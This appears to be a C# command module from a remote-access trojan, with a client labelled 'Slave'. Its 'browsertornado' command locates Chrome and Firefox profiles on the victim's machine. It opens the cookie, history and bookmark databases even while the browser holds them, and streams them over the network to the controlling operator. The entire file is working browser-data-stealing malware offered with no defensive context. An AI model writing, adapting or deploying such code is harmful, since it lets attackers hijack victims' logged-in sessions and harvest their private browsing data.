using Shared;
using System;
using System.Collections.Generic;
using System.IO;
using Slave.Core;

namespace Slave.Commands
{
    internal class BrowserTornado : ICommand
    {
        public string name { get; } = "browsertornado";

        /// <summary>
        /// Remark : Thread.Sleep(50) are necessary has there is a sync problem if they aren't used
        /// </summary>
        public void Process(List<string> args)
        {
            var chromePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"..\Local\Google\Chrome\User Data\Default");

            var firefoxPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"Mozilla\Firefox\Profiles");

            if (Directory.Exists(chromePath))
            {
                SlaveNetworkManager.GetInstance().WriteLine("OK");
                FindAndSendFile(chromePath, "Cookies");
                FindAndSendFile(chromePath, "History");
                FindAndSendFile(chromePath, "Bookmarks");
            }
            else
            {
                SlaveNetworkManager.GetInstance().WriteLine("KO");
            }

            if (Directory.Exists(firefoxPath))
            {
                SlaveNetworkManager.GetInstance().WriteLine("OK");
                firefoxPath = Path.Combine(Directory.GetDirectories(firefoxPath)[0]);
                FindAndSendFile(firefoxPath, "cookies.sqlite");
                FindAndSendFile(firefoxPath, "places.sqlite");
            }
            else
            {
                SlaveNetworkManager.GetInstance().WriteLine("KO");
            }
        }

        void FindAndSendFile(string path, string filename)
        {
            var filepath = Path.Combine(path, filename);
            if (File.Exists(filepath))
            {
                // Open the file and avoid exception if it is in use
                try
                {
                    using (var fs = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        SlaveNetworkManager.GetInstance().WriteLine("OK");
                        SlaveNetworkManager.GetInstance().StreamToNetworkStream(fs);
                    }
                }
                catch (IOException)
                {
                    SlaveNetworkManager.GetInstance().WriteLine("KO");
                }
            }
            else
            {
                SlaveNetworkManager.GetInstance().WriteLine("KO");
            }
        }
    }
}
